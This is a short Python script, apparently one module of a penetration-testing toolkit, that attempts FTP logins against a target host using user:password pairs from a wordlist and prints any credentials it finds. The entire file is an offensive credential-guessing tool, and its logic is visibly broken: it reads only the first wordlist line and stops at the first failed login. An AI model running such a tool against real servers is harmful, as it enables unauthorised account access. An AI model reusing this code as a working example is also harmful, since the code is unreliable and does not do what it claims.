import ftplib
import os

current_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))


def bruteforce(target):
    server = ftplib.FTP()
    with open(current_path + "/data/wordlists/ftp_wordlist.txt") as f:
        lines = f.readline().strip().split(":")
        while lines:
            try:
                server.connect(target, 21, timeout=5)
                server.login(lines[0], lines[1])
            except ftplib.error_perm:
                return False
            else:
                print("[+] Credentials Found {0}".format(lines))
                return True


def run(target):
    success = bruteforce(target)
    if success:
        return True
    else:
        return False


if __name__ == "__main__":
    host = "127.0.0.1"
    run(host)
